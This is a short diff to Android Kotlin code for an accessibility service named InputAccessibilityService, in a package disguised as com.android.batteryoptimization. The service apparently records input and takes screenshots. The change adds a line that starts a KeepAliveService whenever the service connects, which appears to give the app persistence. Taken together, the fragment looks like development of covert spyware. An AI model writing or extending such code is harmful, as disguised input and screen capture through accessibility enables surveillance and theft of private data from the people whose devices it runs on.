@@ -1,6 +1,7 @@
 package com.android.batteryoptimization
 
 import android.accessibilityservice.AccessibilityService
+import android.content.Intent
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 
@@ -15,6 +16,8 @@ class InputAccessibilityService : AccessibilityService() {
         instance = this
         repository = InputRepository.getInstance(applicationContext)
         Log.d(TAG, "Accessibility Service Connected")
+
+        startService(Intent(this, KeepAliveService::class.java))
 
         val filter = android.content.IntentFilter(ACTION_TAKE_SCREENSHOT)
         screenshotReceiver = object : android.content.BroadcastReceiver() {
